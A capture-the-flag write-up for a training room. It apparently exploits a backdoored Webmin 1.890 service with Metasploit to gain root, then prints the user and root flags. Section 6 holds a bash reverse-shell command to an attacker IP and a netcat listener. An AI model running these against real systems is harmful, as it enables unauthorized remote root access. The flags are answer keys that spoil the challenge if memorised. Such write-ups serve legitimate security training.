# Source Write‑up

## 1. Room Overview

In this room, the goal is to enumerate the target machine, discover vulnerabilities, exploit them, and obtain both the **user flag** and the **root flag**.

Target IP:

```
10.128.135.152
```

---

# 2. Connectivity Check

The first step was to verify that the target machine was reachable using **ping**.

```bash
ping 10.128.135.152
```

Output:

```
PING 10.128.135.152 (10.128.135.152) 56(84) bytes of data.
64 bytes from 10.128.135.152: icmp_seq=1 ttl=62 time=123 ms
64 bytes from 10.128.135.152: icmp_seq=2 ttl=62 time=146 ms
```

The host responded successfully, confirming that the target machine is online.

---

# 3. Port Scanning

Next, I performed a port scan using **Nmap** to discover open ports and services.

```bash
nmap -sC -sV 10.128.135.152
```

Options used:

- **-sC** → Run default scripts
    
- **-sV** → Detect service versions
    

Scan result:

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
```

Two services were discovered:

|Port|Service|Version|
|---|---|---|
|22|SSH|OpenSSH 7.6|
|10000|HTTP|MiniServ 1.890|

The most interesting service is **port 10000**, running **Webmin**.

---

# 4. Vulnerability Research

Searching for vulnerabilities related to **Webmin MiniServ 1.890**, I discovered a known backdoor vulnerability.

This vulnerability affects certain versions of **Webmin** and allows **remote command execution**.

The exploit is documented in **Metasploit Framework**:

```
exploit/linux/http/webmin_backdoor
```

Module name:

```
Webmin password_change.cgi Backdoor
```

---

# 5. Exploitation

I launched **Metasploit** to exploit the vulnerability.

```
msfconsole
```

Then selected the exploit:

```
use exploit/linux/http/webmin_backdoor
```

Configuration:

```
set RHOSTS 10.128.135.152
set LHOST 192.168.128.91
set SSL true
run
```

After running the exploit, a **root shell** was obtained.

---

# 6. Getting a Reverse Shell

To stabilize the shell, I used **Netcat**.

Listener on attacker machine:

```bash
nc -lvnp 4444
```

Then executed the following command in the Metasploit session:

```bash
bash -c "bash -i >& /dev/tcp/192.168.128.91/4444 0>&1"
```

This provided a fully interactive shell.

---

# 7. User Flag

Navigated to the user directory:

```bash
cd /home
ls
```

Output:

```
dark
```

Entering the directory:

```bash
cd dark
ls
```

Files found:

```
user.txt
```

Reading the flag:

```bash
cat user.txt
```

User flag:

```
THM{SUPPLY_CHAIN_COMPROMISE}
```

---

# 8. Root Flag

Since the exploit already provided **root privileges**, the root directory could be accessed directly.

```bash
cd /root
ls
```

Output:

```
root.txt
```

Reading the flag:

```bash
cat root.txt
```

Root flag:

```
THM{UPDATE_YOUR_INSTALL}
```

---

# 9. Conclusion

In this room, the attack followed these steps:

1. Verified connectivity using **ping**
    
2. Performed enumeration using **Nmap**
    
3. Identified **Webmin MiniServ 1.890** running on port 10000
    
4. Researched vulnerabilities and found a **Webmin backdoor exploit**
    
5. Used **Metasploit** to gain **root access**
    
6. Retrieved both **user** and **root** flags
    

This room demonstrates the importance of **keeping software updated**, as outdated versions of Webmin may contain severe vulnerabilities such as remote command execution backdoors.

---

✅ **Flags obtained**

User flag

```
THM{SUPPLY_CHAIN_COMPROMISE}
```

Root flag

```
THM{UPDATE_YOUR_INSTALL}
```